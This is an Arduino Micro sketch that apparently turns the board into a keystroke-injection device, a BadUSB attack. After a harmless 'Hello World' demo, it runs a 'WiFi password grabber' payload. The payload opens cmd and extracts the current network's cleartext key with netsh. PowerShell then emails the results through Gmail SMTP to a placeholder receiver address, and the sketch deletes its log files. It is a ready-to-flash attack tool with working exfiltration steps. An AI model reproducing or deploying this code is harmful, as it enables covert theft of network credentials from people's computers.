/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

/* USE ON THE ARDUINO MICRO */

/*
 * Last modification:
 * 08/06/2017
 * 
 * Kaylani Bochie
 * 
 * The sketch uses 7.023 bytes (24%) of program storage space.
 * Global variables use 1.443 bytes (56%) of dynamic memory.
 * 
 * Just the "Hello, World" and "Password grabber" payloads
 * Not suitable to use multiple payloads without a micro sd card
 */


#include "Keyboard.h"

void
typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void
setup()
{
  Keyboard.begin(); 
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("notepad");
  delay(500);
  typeKey(KEY_RETURN);
  delay(750);
  Keyboard.print("Hello World!!!");
  typeKey(KEY_RETURN);
  Keyboard.end();

  /*-------------------------------------------------------------------------*/

  // Title: WiFi password grabber
  // Author: Siem
  // Version: 4
  // Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
  delay(3000);
  // --> Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  // --> Open cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  typeKey(KEY_RETURN);
  delay(200);
  // --> Getting SSID
  Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=:\" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
  typeKey(KEY_RETURN);
  Keyboard.print("set A=\"%A:~1%\"");
  typeKey(KEY_RETURN);
  // --> Creating A.txt
  Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");
  typeKey(KEY_RETURN);
  // --> Get network type
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");
  typeKey(KEY_RETURN);
  // --> Get authentication
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");
  typeKey(KEY_RETURN);
  // --> Get password
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");
  typeKey(KEY_RETURN);
  // --> Delete A.txt
  Keyboard.print("del A.txt");
  typeKey(KEY_RETURN);
  // --> Create Log.txt
  Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
  typeKey(KEY_RETURN);
  // --> Mail Log.txt
  Keyboard.print("powershell");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.EnableSsl = $true");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.From = 'ACCOUNT@gmail.com'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.To.Add('RECEIVER@gmail.com')");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Subject = 'WiFi key grabber'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(500);
  // --> Delete Log.txt and exit
  Keyboard.print("del Log.txt & exit");
  typeKey(KEY_RETURN);
}

void
loop() {}
